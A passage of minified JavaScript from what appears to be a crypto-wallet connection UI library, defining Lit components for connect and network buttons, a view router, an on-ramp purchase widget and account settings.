`;var Pu=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};class xl extends he{constructor(){super(...arguments),this.unsubscribe=[],this.disabled=!1,this.balance=void 0,this.size=void 0,this.label=void 0,this.loadingLabel=void 0,this.charsStart=4,this.charsEnd=6,this.caipAddress=re.state.activeCaipAddress,this.isLoading=Ut.state.loading}firstUpdated(){this.unsubscribe.push(re.subscribeKey("activeCaipAddress",e=>this.caipAddress=e),Ut.subscribeKey("loading",e=>this.isLoading=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return this.caipAddress&&!this.isLoading?F`
          <appkit-account-button
            .disabled=${!!this.disabled}
            balance=${ye(this.balance)}
            .charsStart=${ye(this.charsStart)}
            .charsEnd=${ye(this.charsEnd)}
          >
          </appkit-account-button>
        `:F`
          <appkit-connect-button
            size=${ye(this.size)}
            label=${ye(this.label)}
            loadingLabel=${ye(this.loadingLabel)}
          ></appkit-connect-button>
        `}}xl.styles=NOe;Pu([V({type:Boolean})],xl.prototype,"disabled",void 0);Pu([V()],xl.prototype,"balance",void 0);Pu([V()],xl.prototype,"size",void 0);Pu([V()],xl.prototype,"label",void 0);Pu([V()],xl.prototype,"loadingLabel",void 0);Pu([V()],xl.prototype,"charsStart",void 0);Pu([V()],xl.prototype,"charsEnd",void 0);Pu([te()],xl.prototype,"caipAddress",void 0);Pu([te()],xl.prototype,"isLoading",void 0);let Lq=class extends xl{};Lq=Pu([me("w3m-button")],Lq);let Uq=class extends xl{};Uq=Pu([me("appkit-button")],Uq);var b2=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};class v2 extends he{constructor(){super(),this.unsubscribe=[],this.size="md",this.label="Connect Wallet",this.loadingLabel="Connecting...",this.open=Ut.state.open,this.loading=Ut.state.loading,this.unsubscribe.push(Ut.subscribe(e=>{this.open=e.open,this.loading=e.loading}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.loading||this.open;return F`
      <wui-connect-button
        size=${ye(this.size)}
        .loading=${e}
        @click=${this.onClick.bind(this)}
        data-testid="connect-button"
      >
        ${e?this.loadingLabel:this.label}
      </wui-connect-button>
    `}onClick(){this.open?Ut.close():this.loading||Ut.open()}}b2([V()],v2.prototype,"size",void 0);b2([V()],v2.prototype,"label",void 0);b2([V()],v2.prototype,"loadingLabel",void 0);b2([te()],v2.prototype,"open",void 0);b2([te()],v2.prototype,"loading",void 0);let jq=class extends v2{};jq=b2([me("w3m-connect-button")],jq);let Fq=class extends v2{};Fq=b2([me("appkit-connect-button")],Fq);const POe=ge`
  :host {
    display: block;
    width: max-content;
  }
`;var B0=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};class eh extends he{constructor(){super(),this.unsubscribe=[],this.disabled=!1,this.network=re.state.activeCaipNetwork,this.networkImage=Nr.getNetworkImage(this.network),this.caipAddress=re.state.activeCaipAddress,this.loading=Ut.state.loading,this.isSupported=Ne.state.allowUnsupportedChain?!0:re.state.activeChain?re.checkIfSupportedNetwork(re.state.activeChain):!0,this.unsubscribe.push(Li.subscribeNetworkImages(()=>{this.networkImage=Nr.getNetworkImage(this.network)}),re.subscribeKey("activeCaipAddress",e=>{this.caipAddress=e}),re.subscribeKey("activeCaipNetwork",e=>{this.network=e,this.networkImage=Nr.getNetworkImage(e),this.isSupported=e?.chainNamespace?re.checkIfSupportedNetwork(e.chainNamespace):!0}),Ut.subscribeKey("loading",e=>this.loading=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.network?re.checkIfSupportedNetwork(this.network.chainNamespace):!0;return F`
      <wui-network-button
        .disabled=${!!(this.disabled||this.loading)}
        .isUnsupportedChain=${Ne.state.allowUnsupportedChain?!1:!e}
        imageSrc=${ye(this.networkImage)}
        @click=${this.onClick.bind(this)}
        data-testid="w3m-network-button"
      >
        ${this.getLabel()}
        <slot></slot>
      </wui-network-button>
    `}getLabel(){return this.network?!this.isSupported&&!Ne.state.allowUnsupportedChain?"Switch Network":this.network.name:this.label?this.label:this.caipAddress?"Unknown Network":"Select Network"}onClick(){this.loading||(Ve.sendEvent({type:"track",event:"CLICK_NETWORKS"}),Ut.open({view:"Networks"}))}}eh.styles=POe;B0([V({type:Boolean})],eh.prototype,"disabled",void 0);B0([V({type:String})],eh.prototype,"label",void 0);B0([te()],eh.prototype,"network",void 0);B0([te()],eh.prototype,"networkImage",void 0);B0([te()],eh.prototype,"caipAddress",void 0);B0([te()],eh.prototype,"loading",void 0);B0([te()],eh.prototype,"isSupported",void 0);let qq=class extends eh{};qq=B0([me("w3m-network-button")],qq);let zq=class extends eh{};zq=B0([me("appkit-network-button")],zq);const $Oe=ge`
  :host {
    --prev-height: 0px;
    --new-height: 0px;
    display: block;
  }

  div.w3m-router-container {
    transform: translateY(0);
    opacity: 1;
  }

  div.w3m-router-container[view-direction='prev'] {
    animation:
      slide-left-out 150ms forwards ease,
      slide-left-in 150ms forwards ease;
    animation-delay: 0ms, 200ms;
  }

  div.w3m-router-container[view-direction='next'] {
    animation:
      slide-right-out 150ms forwards ease,
      slide-right-in 150ms forwards ease;
    animation-delay: 0ms, 200ms;
  }

  @keyframes slide-left-out {
    from {
      transform: translateX(0px);
      opacity: 1;
    }
    to {
      transform: translateX(10px);
      opacity: 0;
    }
  }

  @keyframes slide-left-in {
    from {
      transform: translateX(-10px);
      opacity: 0;
    }
    to {
      transform: translateX(0);
      opacity: 1;
    }
  }

  @keyframes slide-right-out {
    from {
      transform: translateX(0px);
      opacity: 1;
    }
    to {
      transform: translateX(-10px);
      opacity: 0;
    }
  }

  @keyframes slide-right-in {
    from {
      transform: translateX(10px);
      opacity: 0;
    }
    to {
      transform: translateX(0);
      opacity: 1;
    }
  }
`;var ZR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let cy=class extends he{constructor(){super(),this.resizeObserver=void 0,this.prevHeight="0px",this.prevHistoryLength=1,this.unsubscribe=[],this.view=Ee.state.view,this.viewDirection="",this.unsubscribe.push(Ee.subscribeKey("view",e=>this.onViewChange(e)))}firstUpdated(){this.resizeObserver=new ResizeObserver(([e])=>{const t=`${e?.contentRect.height}px`;this.prevHeight!=="0px"&&(this.style.setProperty("--prev-height",this.prevHeight),this.style.setProperty("--new-height",t),this.style.animation="w3m-view-height 150ms forwards ease",this.style.height="auto"),setTimeout(()=>{this.prevHeight=t,this.style.animation="unset"},wd.ANIMATION_DURATIONS.ModalHeight)}),this.resizeObserver.observe(this.getWrapper())}disconnectedCallback(){this.resizeObserver?.unobserve(this.getWrapper()),this.unsubscribe.forEach(e=>e())}render(){return F`<div class="w3m-router-container" view-direction="${this.viewDirection}">
      ${this.viewTemplate()}
    </div>`}viewTemplate(){switch(this.view){case"AccountSettings":return F`<w3m-account-settings-view></w3m-account-settings-view>`;case"Account":return F`<w3m-account-view></w3m-account-view>`;case"AllWallets":return F`<w3m-all-wallets-view></w3m-all-wallets-view>`;case"ApproveTransaction":return F`<w3m-approve-transaction-view></w3m-approve-transaction-view>`;case"BuyInProgress":return F`<w3m-buy-in-progress-view></w3m-buy-in-progress-view>`;case"ChooseAccountName":return F`<w3m-choose-account-name-view></w3m-choose-account-name-view>`;case"Connect":return F`<w3m-connect-view></w3m-connect-view>`;case"Create":return F`<w3m-connect-view walletGuide="explore"></w3m-connect-view>`;case"ConnectingWalletConnect":return F`<w3m-connecting-wc-view></w3m-connecting-wc-view>`;case"ConnectingWalletConnectBasic":return F`<w3m-connecting-wc-basic-view></w3m-connecting-wc-basic-view>`;case"ConnectingExternal":return F`<w3m-connecting-external-view></w3m-connecting-external-view>`;case"ConnectingSiwe":return F`<w3m-connecting-siwe-view></w3m-connecting-siwe-view>`;case"ConnectWallets":return F`<w3m-connect-wallets-view></w3m-connect-wallets-view>`;case"ConnectSocials":return F`<w3m-connect-socials-view></w3m-connect-socials-view>`;case"ConnectingSocial":return F`<w3m-connecting-social-view></w3m-connecting-social-view>`;case"Downloads":return F`<w3m-downloads-view></w3m-downloads-view>`;case"EmailVerifyOtp":return F`<w3m-email-verify-otp-view></w3m-email-verify-otp-view>`;case"EmailVerifyDevice":return F`<w3m-email-verify-device-view></w3m-email-verify-device-view>`;case"GetWallet":return F`<w3m-get-wallet-view></w3m-get-wallet-view>`;case"Networks":return F`<w3m-networks-view></w3m-networks-view>`;case"SwitchNetwork":return F`<w3m-network-switch-view></w3m-network-switch-view>`;case"Profile":return F`<w3m-profile-view></w3m-profile-view>`;case"SwitchAddress":return F`<w3m-switch-address-view></w3m-switch-address-view>`;case"Transactions":return F`<w3m-transactions-view></w3m-transactions-view>`;case"OnRampProviders":return F`<w3m-onramp-providers-view></w3m-onramp-providers-view>`;case"OnRampActivity":return F`<w3m-onramp-activity-view></w3m-onramp-activity-view>`;case"OnRampTokenSelect":return F`<w3m-onramp-token-select-view></w3m-onramp-token-select-view>`;case"OnRampFiatSelect":return F`<w3m-onramp-fiat-select-view></w3m-onramp-fiat-select-view>`;case"UpgradeEmailWallet":return F`<w3m-upgrade-wallet-view></w3m-upgrade-wallet-view>`;case"UpdateEmailWallet":return F`<w3m-update-email-wallet-view></w3m-update-email-wallet-view>`;case"UpdateEmailPrimaryOtp":return F`<w3m-update-email-primary-otp-view></w3m-update-email-primary-otp-view>`;case"UpdateEmailSecondaryOtp":return F`<w3m-update-email-secondary-otp-view></w3m-update-email-secondary-otp-view>`;case"UnsupportedChain":return F`<w3m-unsupported-chain-view></w3m-unsupported-chain-view>`;case"Swap":return F`<w3m-swap-view></w3m-swap-view>`;case"SwapSelectToken":return F`<w3m-swap-select-token-view></w3m-swap-select-token-view>`;case"SwapPreview":return F`<w3m-swap-preview-view></w3m-swap-preview-view>`;case"WalletSend":return F`<w3m-wallet-send-view></w3m-wallet-send-view>`;case"WalletSendSelectToken":return F`<w3m-wallet-send-select-token-view></w3m-wallet-send-select-token-view>`;case"WalletSendPreview":return F`<w3m-wallet-send-preview-view></w3m-wallet-send-preview-view>`;case"WhatIsABuy":return F`<w3m-what-is-a-buy-view></w3m-what-is-a-buy-view>`;case"WalletReceive":return F`<w3m-wallet-receive-view></w3m-wallet-receive-view>`;case"WalletCompatibleNetworks":return F`<w3m-wallet-compatible-networks-view></w3m-wallet-compatible-networks-view>`;case"WhatIsAWallet":return F`<w3m-what-is-a-wallet-view></w3m-what-is-a-wallet-view>`;case"ConnectingMultiChain":return F`<w3m-connecting-multi-chain-view></w3m-connecting-multi-chain-view>`;case"WhatIsANetwork":return F`<w3m-what-is-a-network-view></w3m-what-is-a-network-view>`;case"ConnectingFarcaster":return F`<w3m-connecting-farcaster-view></w3m-connecting-farcaster-view>`;case"SwitchActiveChain":return F`<w3m-switch-active-chain-view></w3m-switch-active-chain-view>`;case"RegisterAccountName":return F`<w3m-register-account-name-view></w3m-register-account-name-view>`;case"RegisterAccountNameSuccess":return F`<w3m-register-account-name-success-view></w3m-register-account-name-success-view>`;case"SmartSessionCreated":return F`<w3m-smart-session-created-view></w3m-smart-session-created-view>`;case"SmartSessionList":return F`<w3m-smart-session-list-view></w3m-smart-session-list-view>`;case"SIWXSignMessage":return F`<w3m-siwx-sign-message-view></w3m-siwx-sign-message-view>`;default:return F`<w3m-connect-view></w3m-connect-view>`}}onViewChange(e){oc.hide();let t=wd.VIEW_DIRECTION.Next;const{history:i}=Ee.state;i.length<this.prevHistoryLength&&(t=wd.VIEW_DIRECTION.Prev),this.prevHistoryLength=i.length,this.viewDirection=t,setTimeout(()=>{this.view=e},wd.ANIMATION_DURATIONS.ViewTransition)}getWrapper(){return this.shadowRoot?.querySelector("div")}};cy.styles=$Oe;ZR([te()],cy.prototype,"view",void 0);ZR([te()],cy.prototype,"viewDirection",void 0);cy=ZR([me("w3m-router")],cy);const ROe=ge`
  :host > wui-flex {
    width: 100%;
    max-width: 360px;
  }

  :host > wui-flex > wui-flex {
    border-radius: var(--wui-border-radius-l);
    width: 100%;
  }

  .amounts-container {
    width: 100%;
  }
`;var Pp=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};const OOe={USD:"$",EUR:"",GBP:""},BOe=[100,250,500,1e3];let Fd=class extends he{constructor(){super(),this.unsubscribe=[],this.disabled=!1,this.caipAddress=re.state.activeCaipAddress,this.loading=Ut.state.loading,this.paymentCurrency=Ai.state.paymentCurrency,this.paymentAmount=Ai.state.paymentAmount,this.purchaseAmount=Ai.state.purchaseAmount,this.quoteLoading=Ai.state.quotesLoading,this.unsubscribe.push(re.subscribeKey("activeCaipAddress",e=>this.caipAddress=e),Ut.subscribeKey("loading",e=>{this.loading=e}),Ai.subscribe(e=>{this.paymentCurrency=e.paymentCurrency,this.paymentAmount=e.paymentAmount,this.purchaseAmount=e.purchaseAmount,this.quoteLoading=e.quotesLoading}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return F`
      <wui-flex flexDirection="column" justifyContent="center" alignItems="center">
        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <w3m-onramp-input
            type="Fiat"
            @inputChange=${this.onPaymentAmountChange.bind(this)}
            .value=${this.paymentAmount||0}
          ></w3m-onramp-input>
          <w3m-onramp-input
            type="Token"
            .value=${this.purchaseAmount||0}
            .loading=${this.quoteLoading}
          ></w3m-onramp-input>
          <wui-flex justifyContent="space-evenly" class="amounts-container" gap="xs">
            ${BOe.map(e=>F`<wui-button
                  variant=${this.paymentAmount===e?"accent":"neutral"}
                  size="md"
                  textVariant="paragraph-600"
                  fullWidth
                  @click=${()=>this.selectPresetAmount(e)}
                  >${`${OOe[this.paymentCurrency?.id||"USD"]} ${e}`}</wui-button
                >`)}
          </wui-flex>
          ${this.templateButton()}
        </wui-flex>
      </wui-flex>
    `}templateButton(){return this.caipAddress?F`<wui-button
          @click=${this.getQuotes.bind(this)}
          variant="main"
          fullWidth
          size="lg"
          borderRadius="xs"
        >
          Get quotes
        </wui-button>`:F`<wui-button
          @click=${this.openModal.bind(this)}
          variant="accent"
          fullWidth
          size="lg"
          borderRadius="xs"
        >
          Connect wallet
        </wui-button>`}getQuotes(){this.loading||Ut.open({view:"OnRampProviders"})}openModal(){Ut.open({view:"Connect"})}async onPaymentAmountChange(e){Ai.setPaymentAmount(Number(e.detail)),await Ai.getQuote()}async selectPresetAmount(e){Ai.setPaymentAmount(e),await Ai.getQuote()}};Fd.styles=ROe;Pp([V({type:Boolean})],Fd.prototype,"disabled",void 0);Pp([te()],Fd.prototype,"caipAddress",void 0);Pp([te()],Fd.prototype,"loading",void 0);Pp([te()],Fd.prototype,"paymentCurrency",void 0);Pp([te()],Fd.prototype,"paymentAmount",void 0);Pp([te()],Fd.prototype,"purchaseAmount",void 0);Pp([te()],Fd.prototype,"quoteLoading",void 0);Fd=Pp([me("w3m-onramp-widget")],Fd);var th=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let yu=class extends he{constructor(){super(),this.usubscribe=[],this.networkImages=Li.state.networkImages,this.address=Se.state.address,this.profileImage=Se.state.profileImage,this.profileName=Se.state.profileName,this.network=re.state.activeCaipNetwork,this.preferredAccountType=Se.state.preferredAccountType,this.disconnecting=!1,this.loading=!1,this.switched=!1,this.text="",this.usubscribe.push(Se.subscribe(e=>{e.address?(this.address=e.address,this.profileImage=e.profileImage,this.profileName=e.profileName,this.preferredAccountType=e.preferredAccountType):Ut.close()}),Se.subscribeKey("preferredAccountType",e=>this.preferredAccountType=e),re.subscribeKey("activeCaipNetwork",e=>{e?.id&&(this.network=e)}))}disconnectedCallback(){this.usubscribe.forEach(e=>e())}render(){if(!this.address)throw new Error("w3m-account-settings-view: No account provided");const e=this.networkImages[this.network?.assets?.imageId??""];return F`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        gap="l"
        .padding=${["0","xl","m","xl"]}
      >
        <wui-avatar
          alt=${this.address}
          address=${this.address}
          imageSrc=${ye(this.profileImage)}
          size="2lg"
        ></wui-avatar>
        <wui-flex flexDirection="column" alignItems="center">
          <wui-flex gap="3xs" alignItems="center" justifyContent="center">
            <wui-text variant="title-6-600" color="fg-100" data-testid="account-settings-address">
              ${Wt.getTruncateString({string:this.address,charsStart:4,charsEnd:6,truncate:"middle"})}
            </wui-text>
            <wui-icon-link
              size="md"
              icon="copy"
              iconColor="fg-200"
              @click=${this.onCopyAddress}
            ></wui-icon-link>
          </wui-flex>
        </wui-flex>
      </wui-flex>
      <wui-flex flexDirection="column" gap="m">
        <wui-flex flexDirection="column" gap="xs" .padding=${["0","l","m","l"]}>
          ${this.authCardTemplate()}
          <w3m-account-auth-button></w3m-account-auth-button>
          <wui-list-item
            .variant=${e?"image":"icon"}
            iconVariant="overlay"
            icon="networkPlaceholder"
            imageSrc=${ye(e)}
            ?chevron=${this.isAllowedNetworkSwitch()}
            @click=${this.onNetworks.bind(this)}
            data-testid="account-switch-network-button"
          >
            <wui-text variant="paragraph-500" color="fg-100">
              ${this.network?.name??"Unknown"}
            </wui-text>
          </wui-list-item>
          ${this.togglePreferredAccountBtnTemplate()} ${this.chooseNameButtonTemplate()}
          <wui-list-item
            variant="icon"
            iconVariant="overlay"
            icon="disconnect"
            ?chevron=${!1}
            .loading=${this.disconnecting}
            @click=${this.onDisconnect.bind(this)}
            data-testid="disconnect-button"
          >
            <wui-text variant="paragraph-500" color="fg-200">Disconnect</wui-text>
          </wui-list-item>
        </wui-flex>
      </wui-flex>
    `}chooseNameButtonTemplate(){const e=this.network?.chainNamespace,t=He.getConnectedConnectorId(e),i=Xe.getAuthConnector();return!re.checkIfNamesSupported()||!i||t!==Me.CONNECTOR_ID.AUTH||this.profileName?null:F`
      <wui-list-item
        variant="icon"
        iconVariant="overlay"
        icon="id"
        iconSize="sm"
        ?chevron=${!0}
        @click=${this.onChooseName.bind(this)}
        data-testid="account-choose-name-button"
      >
        <wui-text variant="paragraph-500" color="fg-100">Choose account name </wui-text>
      </wui-list-item>
    `}authCardTemplate(){const e=this.network?.chainNamespace,t=He.getConnectedConnectorId(e),i=Xe.getAuthConnector(),{origin:n}=location;return!i||t!==Me.CONNECTOR_ID.AUTH||n.includes(kr.SECURE_SITE)?null:F`
      <wui-notice-card
        @click=${this.onGoToUpgradeView.bind(this)}
        label="Upgrade your wallet"
        description="Transition to a self-custodial wallet"
        icon="wallet"
        data-testid="w3m-wallet-upgrade-card"
      ></wui-notice-card>
    `}isAllowedNetworkSwitch(){const e=re.getAllRequestedCaipNetworks(),t=e?e.length>1:!1,i=e?.find(({id:n})=>n===this.network?.id);return t||!i}onCopyAddress(){try{this.address&&(ke.copyToClopboard(this.address),vt.showSuccess("Address copied"))}catch{vt.showError("Failed to copy")}}togglePreferredAccountBtnTemplate(){const e=this.network?.chainNamespace,t=re.checkIfSmartAccountEnabled(),i=He.getConnectedConnectorId(e);return!Xe.getAuthConnector()||i!==Me.CONNECTOR_ID.AUTH||!t?null:(this.switched||(this.text=this.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT?"Switch to your EOA":"Switch to your smart account"),F`
      <wui-list-item
        variant="icon"
        iconVariant="overlay"
        icon="swapHorizontalBold"
        iconSize="sm"
        ?chevron=${!0}
        ?loading=${this.loading}
        @click=${this.changePreferredAccountType.bind(this)}
        data-testid="account-toggle-preferred-account-type"
      >
        <wui-text variant="paragraph-500" color="fg-100">${this.text}</wui-text>
      </wui-list-item>
    `)}onChooseName(){Ee.push("ChooseAccountName")}async changePreferredAccountType(){const e=re.checkIfSmartAccountEnabled(),t=this.preferredAccountType===vr.ACCOUNT_TYPES.SMART_ACCOUNT||!e?vr.ACCOUNT_TYPES.EOA:vr.ACCOUNT_TYPES.SMART_ACCOUNT;Xe.getAuthConnector()&&(this.loading=!0,await ft.setPreferredAccountType(t),this.text=t===vr.ACCOUNT_TYPES.SMART_ACCOUNT?"Switch to your EOA":"Switch to your smart account",this.switched=!0,Dr.resetSend(),this.loading=!1,this.requestUpdate())}onNetworks(){this.isAllowedNetworkSwitch()&&Ee.push("Networks")}async onDisconnect(){try{this.disconnecting=!0,await ft.disconnect(),Ve.sendEvent({type:"track",event:"DISCONNECT_SUCCESS"}),Ut.close()}catch{Ve.sendEvent({type:"track",event:"DISCONNECT_ERROR"}),vt.showError("Failed to disconnect")}finally{this.disconnecting=!1}}onGoToUpgradeView(){Ve.sendEvent({type:"track",event:"EMAIL_UPGRADE_FROM_MODAL"}),Ee.push("UpgradeEmailWallet")}};th([te()],yu.prototype,"address",void 0);th([te()],yu.prototype,"profileImage",void 0);th([te()],yu.prototype,"profileName",void 0);th([te()],yu.prototype,"network",void 0);th([te()],yu.prototype,"preferredAccountType",void 0);th([te()],yu.prototype,"disconnecting",void 0);th([te()],yu.prototype,"loading",void 0);th([te()],yu.prototype,"switched",void 0);th([te()],yu.prototype,"text",void 0);yu=th([me("w3m-account-settings-view")],yu);var Uee=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let qk=class extends he{constructor(){super(),this.unsubscribe=[],this.namespace=re.state.activeChain,this.unsubscribe.push(re.subscribeKey("activeChain",e=>{this.namespace=e}))}render(){if(!this.namespace)return null;const e=He.getConnectedConnectorId(this.namespace),t=Xe.getAuthConnector();return F`
      ${t&&e===Me.CONNECTOR_ID.AUTH?this.walletFeaturesTemplate():this.defaultTemplate()}
    `}walletFeaturesTemplate(){return F`<w3m-account-wallet-features-widget></w3m-account-wallet-features-widget>`}defaultTemplate(){return F`<w3m-account-default-widget></w3m-account-default-widget>`}};Uee([te()],qk.prototype,"namespace",void 0);qk=Uee([me("w3m-account-view")],qk);var YR=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let C7=class extends he{constructor(){super(...arguments),this.search="",this.onDebouncedSearch=ke.debounce(e=>{this.search=e})}render(){const e=this.search.length>=2;return F`
      <wui-flex .padding=${["0","s","s","s"]} gap="xs">
        <wui-search-bar @inputChange=${this.onInputChange.bind(this)}></wui-search-bar>
        <wui-certified-switch
          ?checked=${this.badge}
          @click=${this.onClick.bind(this)}
          data-testid="wui-certified-switch"
        ></wui-certified-switch>
        ${this.qrButtonTemplate()}
      </wui-flex>
      ${e||this.badge?F`<w3m-all-wallets-search
            query=${this.search}
            badge=${ye(this.badge)}
          ></w3m-all-wallets-search>`:F`<w3m-all-wallets-list badge=${ye(this.badge)}></w3m-all-wallets-list>`}
    `}onInputChange(e){this.onDebouncedSearch(e.detail)}onClick(){if(this.badge==="certified"){this.badge=void 0;return}this.badge="certified",vt.showSvg("Only WalletConnect certified",{icon:"walletConnectBrown",iconColor:"accent-100"})}qrButtonTemplate(){return ke.isMobile()?F`
        <wui-icon-box
          size="lg"
          iconSize="xl"
          iconColor="accent-100"
          backgroundColor="accent-100"
          icon="qrCode"
          background="transparent"
          border
          borderColor="wui-accent-glass-010"
          @click=${this.onWalletConnectQr.bind(this)}
        ></wui-icon-box>
      `:null}onWalletConnectQr(){Ee.push("ConnectingWalletConnect")}};YR([te()],C7.prototype,"search",void 0);YR([te()],C7.prototype,"badge",void 0);C7=YR([me("w3m-all-wallets-view")],C7);const MOe=ge`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-thumbnail {
    position: absolute;
  }

  wui-visual {
    width: var(--wui-wallet-image-size-lg);
    height: var(--wui-wallet-image-size-lg);
    border-radius: calc(var(--wui-border-radius-5xs) * 9 - var(--wui-border-radius-xxs));
    position: relative;
    overflow: hidden;
  }

  wui-visual::after {
    content: '';
    display: block;
    width: 100%;
    height: 100%;
    position: absolute;
    inset: 0;
    border-radius: calc(var(--wui-border-radius-5xs) * 9 - var(--wui-border-radius-xxs));
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-005);
  }

  wui-icon-box {
    position: absolute;
    right: calc(var(--wui-spacing-3xs) * -1);
    bottom: calc(var(--wui-spacing-3xs) * -1);
    opacity: 0;
    transform: scale(0.5);
    transition:
      opacity var(--wui-ease-out-power-2) var(--wui-duration-lg),
      transform var(--wui-ease-out-power-2) var(--wui-duration-lg);
    will-change: opacity, transform;
  }

  wui-text[align='center'] {
    width: 100%;
    padding: 0px var(--wui-spacing-l);
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  [data-retry='false'] wui-link {
    display: none;
  }

  [data-retry='true'] wui-link {
    display: block;
    opacity: 1;
  }

  wui-link {
    padding: var(--wui-spacing-4xs) var(--wui-spacing-xxs);
  }
`;var $u=function(r,e,t,i){var n=arguments.length,s=n<3?e:i===null?i=Object.getOwnPropertyDescriptor(e,t):i,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(r,e,t,i);else for(var a=r.length-1;a>=0;a--)(o=r[a])&&(s=(n<3?o(s):n>3?o(e,t,s):o(e,t))||s);return n>3&&s&&Object.defineProperty(e,t,s),s};let bc=class extends he{constructor(){super(),this.unsubscribe=[],this.selectedOnRampProvider=Ai.state.selectedProvider,this.uri=ft.state.wcUri,this.ready=!1,this.showRetry=!1,this.buffering=!1,this.error=!1,this.startTime=null,this.isMobile=!1,this.onRetry=void 0,this.unsubscribe.push(Ai.subscribeKey("selectedProvider",e=>{this.selectedOnRampProvider=e})),this.watchTransactions()}disconnectedCallback(){this.intervalId&&clearInterval(this.intervalId)}render(){let e="Continue in external window";this.error?e="Buy failed":this.selectedOnRampProvider&&(e=`Buy in ${this.selectedOnRampProvider?.label}`);const t=this.error?"Buy can be declined from your side or due to and error on the provider app":"Well notify you once your Buy is processed";return F`
      <wui-flex
        data-error=${ye(this.error)}
        data-retry=${this.showRetry}
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-visual
            name=${ye(this.selectedOnRampProvider?.name)}
            size="lg"
            class="provider-image"
          >
          </wui-visual>

          ${this.error?null:this.loaderTemplate()}

          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            border
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text variant="paragraph-500" color=${this.error?"error-100":"fg-100"}>
            ${e}
          </wui-text>
          <wui-text align="center" variant="small-500" color="fg-200">${t}</wui-text>
        </wui-flex>

        ${this.error?this.tryAgainTemplate():null}
      </wui-flex>

      <wui-flex .padding=${["0","xl","xl","xl"]} justifyContent="center">
        <wui-link @click=${this.onCopyUri} color="fg-200">
          <wui-icon size="xs" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
          Copy link
        </wui-link>
      </wui-flex>
